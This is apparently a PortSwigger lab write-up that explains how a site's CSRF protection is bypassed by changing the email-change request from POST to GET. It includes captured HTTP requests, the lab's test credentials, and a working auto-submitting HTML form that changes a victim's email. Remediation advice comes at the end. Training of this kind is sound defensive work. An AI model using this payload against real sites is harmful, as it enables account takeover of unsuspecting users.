# CSRF Where Token Validation Depends on Request Method

## Objective

The objective of this lab was to exploit a Cross-Site Request Forgery (CSRF) vulnerability in the application's email-change functionality.

The application uses a CSRF token to protect the email-change request, but the token validation depends on the HTTP request method.

The goal was to bypass the CSRF protection and change the victim's email address using the exploit server.

## Vulnerability

The application correctly validates the CSRF token when the email-change request is sent using the `POST` method.

However, when the same request is changed to use the `GET` method, the application does not validate the CSRF token.

This allows an attacker to construct a malicious URL that changes the victim's email address without requiring a valid CSRF token.

## Credentials

The lab provides the following credentials for testing:

```text
Username: wiener
Password: peter
```

## Exploitation

### 1. Log In

I first logged into the application using the provided credentials:

```
wiener:peter
```

I then navigated to the account page and used the Update email functionality.

### 2. Capture the Email Change Request

Using Burp Suite, I intercepted the request generated when submitting the email-change form.

The request was a POST request similar to:

```http
POST /my-account/change-email HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

csrf=RANDOM_TOKEN&email=test@example.com
```

The important parameters were:

- `csrf=RANDOM_TOKEN`
- `email=test@example.com`

### 3. Test CSRF Token Validation

I sent the request to Burp Repeater and modified the value of the `csrf` parameter.

When the request was sent using POST with an invalid CSRF token, the application rejected the request.

This confirmed that CSRF token validation was active for POST requests.

### 4. Change the Request Method

I then changed the request method from `POST` to `GET`.

The resulting request was conceptually:

```http
GET /my-account/change-email?email=test@example.com HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

The CSRF token was no longer required.

The application accepted the request even though no valid CSRF token was supplied.

This confirmed that CSRF token validation depended on the HTTP request method.

## Exploit

To exploit the vulnerability, I created an HTML page on the PortSwigger exploit server that automatically submitted a request to the vulnerable endpoint.

The exploit used the following HTML:

```html
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="attacker@example.com">
</form>

<script>
    document.forms[0].submit();
</script>
```

Because the form does not specify a method, the browser submits it using GET by default.

The resulting request is therefore equivalent to:

```
GET /my-account/change-email?email=attacker@example.com
```

No CSRF token is included because the application does not require one for the GET request.

## Exploit Server

I placed the malicious HTML in the Body section of the PortSwigger exploit server and stored the exploit.

I first used View exploit to verify that the request worked.

After confirming that the email address could be changed, I changed the email value to a different address and used Deliver to victim.

The victim's browser automatically included the victim's authenticated session cookie when making the request to the vulnerable application.

The application then processed the request and changed the victim's email address.

## Attack Flow

```
Attacker
   |
   | Creates malicious HTML
   v
Exploit Server
   |
   | Victim visits exploit
   v
Victim's Browser
   |
   | GET /my-account/change-email?email=attacker@example.com
   | Includes victim's session cookie
   v
Vulnerable Application
   |
   | GET requests bypass CSRF validation
   v
Email Address Changed
   |
   v
Lab Solved
```

## Why the Attack Worked

The application implemented CSRF token validation inconsistently.

For a POST request:

```
POST + invalid/missing CSRF token
        |
CSRF validation
        |
Request rejected
```

For a GET request:

```
GET + no CSRF token
        |
CSRF validation skipped
        |
Request accepted
```

The vulnerability therefore came from applying CSRF protection to only one HTTP method instead of validating the CSRF token for every request that performs the sensitive action.

## Key Payload

The main exploit was:

```html
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="attacker@example.com">
</form>

<script>
    document.forms[0].submit();
</script>
```

The important detail is that no `method="POST"` attribute is specified.

HTML forms use GET by default, allowing the exploit to trigger the vulnerable GET endpoint.

## Conclusion

The lab was successfully exploited by bypassing CSRF token validation through an HTTP method change.

The exploitation process was:

1. Log in using `wiener:peter`.
2. Submit the email-change form.
3. Capture the POST request using Burp Suite.
4. Confirm that an invalid CSRF token causes the POST request to be rejected.
5. Change the request method from POST to GET.
6. Confirm that the CSRF token is no longer validated.
7. Create a malicious HTML form that submits a GET request.
8. Host the exploit on the PortSwigger exploit server.
9. Deliver the exploit to the victim.
10. The victim's email address is changed and the lab is solved.

## Key Takeaways

- CSRF tokens must be validated consistently for every request that performs a sensitive action.
- Changing the HTTP method can sometimes bypass poorly implemented CSRF protection.
- Sensitive state-changing operations should generally use appropriate HTTP methods and should not be performed through GET.
- CSRF validation should not depend solely on the request method.
- A valid CSRF token should be required regardless of whether the request uses GET, POST, or another method.

## Remediation

The application should:

- Require CSRF protection for every state-changing request.
- Validate CSRF tokens regardless of the HTTP method.
- Avoid using GET requests for actions that modify user data.
- Bind CSRF tokens to the user's session.
- Reject requests when the CSRF token is missing or invalid.
- Use appropriate SameSite cookie settings as an additional defense-in-depth measure.
